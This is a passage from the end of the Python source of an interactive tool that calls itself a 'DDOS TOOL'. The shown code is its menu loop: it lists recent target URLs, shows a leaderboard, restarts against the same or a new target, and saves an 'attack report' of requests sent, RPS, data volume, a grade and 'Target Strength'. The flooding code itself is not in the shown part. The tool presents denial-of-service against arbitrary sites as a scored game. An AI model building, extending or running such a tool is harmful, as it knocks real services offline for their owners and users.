                console.print("[dim white]Recent Targets:[/dim white]")
                for i, target in enumerate(reversed(session_stats["target_history"][-5:]), 1):
                    marker = ">" if target == target_url else " "
                    console.print(f"  [dim white]{marker} {i}. {target[:50]}[/dim white]")
                console.print()
            
            # If Ctrl+Q was pressed, go directly back to menu
            if stop_requested:
                console.print("[dim white]Returning to menu...[/dim white]")
                for i in range(3, 0, -1):
                    console.print(f"[dim white]{i}...[/dim white]", end=" ")
                    await asyncio.sleep(0.3)
                console.print()
                console.clear()
                for line in ASCII_LOGO.split('\n'):
                    console.print(f"[bold white]{line}[/bold white]")
                console.print()
                await show_static()
                console.print()
                continue
            
            # Interactive menu
            console.print()
            
            # Show leaderboard
            show_leaderboard()
            
            console.print("[dim white]" + "─" * 70 + "[/dim white]")
            console.print()
            console.print("[bold white]Options:[/bold white]")
            console.print("  [white][R][/white] Restart with same target")
            console.print("  [white][N][/white] New target")
            console.print("  [white][L][/white] View leaderboard")
            console.print("  [white][S][/white] Save report to file")
            console.print("  [white][Q][/white] Quit")
            console.print()
            
            choice = Prompt.ask(
                "[bold white]Select option[/bold white]",
                choices=["r", "n", "l", "s", "q", "R", "N", "L", "S", "Q"],
                default="n"
            )
            
            choice = choice.lower()
            
            if choice == "q":
                console.print()
                console.print("[dim white]> Shutting down...[/dim white]")
                await asyncio.sleep(0.5)
                break
            elif choice == "s":
                # Save report
                filename = f"attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, "w") as f:
                    f.write("=" * 70 + "\n")
                    f.write("DDOS TOOL - ATTACK REPORT\n")
                    f.write("=" * 70 + "\n\n")
                    f.write(f"Target: {target_url}\n")
                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    f.write(f"Total Requests: {stats['total']:,}\n")
                    f.write(f"Successful: {stats['success']:,}\n")
                    f.write(f"Failed: {stats['fail']:,}\n")
                    f.write(f"Success Rate: {current_success_rate:.1f}%\n")
                    f.write(f"RPS: {current_rps:.0f}\n")
                    f.write(f"Data Sent: {stats['bytes_sent']/(1024*1024):.2f} MB\n")
                    f.write(f"Duration: {elapsed:.2f}s\n")
                    f.write(f"Grade: {grade}\n")
                    f.write(f"Target Strength: {target_strength}\n\n")
                    f.write("Errors:\n")
                    for err, count in sorted(error_counts.items(), key=lambda x: x[1], reverse=True):
                        f.write(f"  {err}: {count:,}\n")
                
                console.print(f"[white]> Report saved to {filename}[/white]")
                await asyncio.sleep(1)
                
                # Ask again
                choice = Prompt.ask(
                    "[bold white]Start new attack? (yes/no)[/bold white]",
                    choices=["yes", "no", "y", "n"],
                    default="yes"
                )
                if choice.lower() in ["no", "n"]:
                    break
                choice = "n"  # Continue to new target
            
            if choice == "r":
                # Restart with same target - keep config
                console.print("[dim white]> Restarting with same target...[/dim white]")
                await asyncio.sleep(0.5)
                console.clear()
                for line in ASCII_LOGO.split('\n'):
                    console.print(f"[bold white]{line}[/bold white]")
                console.print()
                await show_static()
                console.print()
                # Skip input, use same config
                continue
            
            # New target (choice == "n")
            console.clear()
            for line in ASCII_LOGO.split('\n'):
                console.print(f"[bold white]{line}[/bold white]")
            console.print()
            await show_static()
            console.print()
            
        except KeyboardInterrupt:
            # Ctrl+C during input - go back to menu
            console.print("\n[dim white]> Returning to menu...[/dim white]")
            await asyncio.sleep(0.5)
            console.clear()
            for line in ASCII_LOGO.split('\n'):
                console.print(f"[bold white]{line}[/bold white]")
            console.print()
            await show_static()
            console.print()
            continue

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        console.print(f"[dim white]FATAL ERROR: {e}[/dim white]")
